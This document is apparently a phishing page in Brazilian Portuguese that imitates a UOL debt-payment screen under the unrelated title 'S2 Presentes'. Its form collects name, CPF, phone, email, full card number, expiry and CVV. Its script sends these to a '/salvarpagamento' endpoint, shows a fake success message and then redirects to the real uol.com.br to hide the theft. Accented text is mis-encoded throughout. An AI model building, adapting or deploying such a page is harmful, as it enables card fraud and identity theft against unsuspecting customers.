<!doctype html>
<html lang="pt-br">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagamento de d√©bitos | S2 Presentes</title>
  <style>
    :root {
      --bg:#f6f6f6; --card:#fff; --text:#222; --muted:#6b7280;
      --primary:#ffc632; --primary-strong:#f3b81a; --accent:#0050ff;
      --border:#e5e7eb; --success:#16a34a;
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text)}
    .container{max-width:960px;margin:24px auto;padding:0 16px}
    .top{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
    .summary{display:flex;justify-content:space-between;align-items:flex-start;background:var(--bg);border-radius:8px;padding:12px 14px;margin-top:8px;flex-wrap:wrap;gap:8px}
    .summary .right{font-weight:600}
    .pay-option{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;margin:16px 0;position:relative}
    .pay-option.active{outline:2px solid var(--accent)}
    .icon{width:42px;height:42px;border-radius:8px;background:#eef2ff;display:flex;align-items:center;justify-content:center;margin-bottom:8px}
    .label{font-weight:600}
    .card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
    .alert{display:flex;gap:10px;background:#fff8e1;border:1px solid #fde68a;color:#92400e;padding:10px 12px;border-radius:8px;align-items:flex-start}
    .alert .i{background:#fde68a;border-radius:999px;width:18px;height:18px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;margin-top:2px}
    .form-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
    label{font-size:12px;color:#374151;margin-bottom:6px;display:block}
    input{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:8px;background:#fff;font-size:14px}
    .btn{display:inline-flex;align-items:center;justify-content:center;background:var(--primary);border:1px solid #eab308;border-radius:8px;padding:10px 16px;font-weight:600;cursor:pointer;width:100%;max-width:220px;text-align:center}
    .btn:hover{background:var(--primary-strong)}
    .footer-actions{display:flex;flex-direction:column;gap:10px;align-items:flex-start;margin-top:12px}
    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:100;visibility:hidden;opacity:0;transition:opacity .3s ease,visibility .3s ease}
    .overlay.active{visibility:visible;opacity:1}
    .loader{border:4px solid #eee;border-top:4px solid var(--accent);border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin-bottom:12px}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .success-check{width:64px;height:64px;border-radius:50%;background:var(--success);display:flex;align-items:center;justify-content:center;color:#fff;font-size:36px}
    .success-text{font-size:18px;font-weight:600;color:var(--success);margin-top:12px;text-align:center}
  </style>
</head>
<body>
  <div class="container">
    <h2 style="text-align:center;margin-bottom:8px">Pagamento de d√©bitos</h2>
    <p style="text-align:center;font-size:12px;color:var(--muted)">O pagamento de d√©bitos n√£o reativa um produto cancelado.</p>

    <div class="top" style="margin-top:12px">
      <div style="font-size:14px;color:#111;margin-bottom:8px">Voc√™ est√° pagando:</div>
      <div class="summary">
        <div>
          <div>Uol Especial Nacional (Relacionamento)</div>
          <div>Uol Pacote Completo 11gb</div>
          <div style="font-size:12px;color:var(--muted)">Total de d√©bitos:</div>
        </div>
        <div class="right">R$ 52,73</div>
      </div>
    </div>

    <div class="pay-option active">
      <div class="icon">üí≥</div>
      <div class="label">Cart√£o de cr√©dito</div>
    </div>

    <div class="card">
      <div class="alert" style="margin-bottom:14px">
        <div class="i">i</div>
        <div>
          <strong>Aten√ß√£o!</strong> Os dados preenchidos ser√£o salvos com seguran√ßa em nosso sistema.
        </div>
      </div>

      <form id="formPagamento">
        <div class="form-grid">
          <div><label>Nome do titular</label><input type="text" name="nome" required></div>
          <div><label>CPF</label><input type="text" id="cpf" name="cpf_cnpj" placeholder="000.000.000-00" maxlength="14" required></div>
          <div><label>Telefone</label><input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" maxlength="15" required></div>
          <div><label>E-mail</label><input type="email" name="email" placeholder="seuemail@exemplo.com" required></div>
          <div><label>N√∫mero do Cart√£o</label><input type="text" id="numero_cartao" name="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
          <div><label>Validade</label><input type="text" id="validade" name="validade" placeholder="MM/AA" maxlength="5" required></div>
          <div><label>CVV</label><input type="text" id="cvv" name="cvv" placeholder="000" maxlength="4" required></div>
        </div>
        <div class="footer-actions">
          <button class="btn" type="submit">Salvar Pagamento</button>
        </div>
      </form>
    </div>
  </div>

  <div class="overlay" id="overlay">
    <div class="loader" id="loader"></div>
    <div class="success-check" id="check" style="display:none">‚úî</div>
    <div class="success-text" id="msg" style="display:none"></div>
  </div>

  <script>
    // M√°scaras autom√°ticas
    const masks = {
      cpf(v){v=v.replace(/\D/g,"").slice(0,11);v=v.replace(/(\d{3})(\d)/,"$1.$2");v=v.replace(/(\d{3})(\d)/,"$1.$2");v=v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");return v},
      tel(v){v=v.replace(/\D/g,"").slice(0,11);v=v.replace(/^(\d{2})(\d)/g,"($1)$2");v=v.replace(/(\d{5})(\d)/,"$1-$2");return v},
      card(v){v=v.replace(/\D/g,"").slice(0,16);v=v.replace(/(\d{4})(?=\d)/g,"$1 ");return v.trim()},
      val(v){v=v.replace(/\D/g,"").slice(0,4);if(v.length>2)v=v.replace(/(\d{2})(\d)/,"$1/$2");return v}
    };

    cpf.oninput = e=>e.target.value = masks.cpf(e.target.value);
    telefone.oninput = e=>e.target.value = masks.tel(e.target.value);
    numero_cartao.oninput = e=>e.target.value = masks.card(e.target.value);
    validade.oninput = e=>e.target.value = masks.val(e.target.value);

    const form = document.getElementById("formPagamento");
    const overlay = document.getElementById("overlay");
    const loader = document.getElementById("loader");
    const check = document.getElementById("check");
    const msg = document.getElementById("msg");

    form.addEventListener("submit", async e => {
      e.preventDefault();
      overlay.classList.add("active");
      loader.style.display = "block";
      check.style.display = "none";
      msg.style.display = "none";

      const formData = Object.fromEntries(new FormData(form).entries());
      try {
        const res = await fetch("/salvarpagamento", {
          method: "POST",
          headers: {"Content-Type": "application/json;charset=utf-8"},
          body: JSON.stringify(formData)
        });

        const text = await res.text();
        loader.style.display = "none";

        if (res.ok) {
          check.style.display = "flex";
          msg.textContent = "Forma de pagamento atualizada com sucesso!";
          msg.style.color = "#16a34a";
          msg.style.display = "block";
          // ‚úÖ Aguarda 2 segundos e redireciona
          setTimeout(() => {
            window.location.href = "https://www.uol.com.br";
          }, 2000);
        } else {
          msg.textContent = "Erro ao salvar: " + text;
          msg.style.color = "red";
          msg.style.display = "block";
          setTimeout(() => overlay.classList.remove("active"), 3000);
        }

      } catch (err) {
        loader.style.display = "none";
        msg.textContent = "Falha na conex√£o. Tente novamente.";
        msg.style.color = "red";
        msg.style.display = "block";
        setTimeout(() => overlay.classList.remove("active"), 3000);
      }
    });
  </script>
</body>
</html>

